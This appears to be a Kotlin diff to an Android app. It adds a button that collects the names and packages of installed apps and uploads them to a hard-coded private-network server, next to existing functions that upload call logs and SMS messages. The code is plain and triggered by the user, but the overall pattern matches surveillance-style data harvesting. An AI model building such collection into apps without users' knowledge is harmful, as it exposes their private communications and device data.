@@ -54,6 +54,10 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
+        val appsButton = findViewById<Button>(R.id.apps_btn)
+        appsButton.setOnClickListener {
+            getInstalledApps()
+        }
     }
 
     private fun uploadCallLogs(logs: List<Map<String, String>>) {
@@ -224,6 +228,63 @@ class MainActivity : AppCompatActivity() {
 
         // Send to backend
         uploadSmsMessages(logs)
+    }
+
+    private fun uploadInstalledApps(apps: List<Map<String, String>>) {
+        Thread {
+            try {
+                val url = URL("http://10.100.237.49:5000/upload_installed_apps/1")
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json; utf-8")
+                conn.doOutput = true
+
+                val jsonBody = JSONObject()
+                val jsonArray = JSONArray()
+
+                for (app in apps) {
+                    val item = JSONObject()
+                    item.put("name", app["name"])
+                    item.put("package", app["package"])
+                    jsonArray.put(item)
+                }
+
+                jsonBody.put("apps", jsonArray)
+
+                val outputStream = conn.outputStream
+                outputStream.write(jsonBody.toString().toByteArray())
+                outputStream.flush()
+                outputStream.close()
+
+                val responseCode = conn.responseCode
+                println("Server response: $responseCode")
+
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }.start()
+    }
+
+    private fun getInstalledApps() {
+        val pm = packageManager
+        val apps = pm.getInstalledApplications(0)
+        val logs = mutableListOf<Map<String, String>>()
+
+        for (app in apps) {
+            if (pm.getLaunchIntentForPackage(app.packageName) != null) {
+                val appName = pm.getApplicationLabel(app).toString()
+                val packageName = app.packageName
+                logs.add(
+                    mapOf(
+                        "name" to appName,
+                        "package" to packageName
+                    )
+                )
+            }
+        }
+
+        // upload the app list to the server
+        uploadInstalledApps(logs)
     }
 
     // Handle permission result
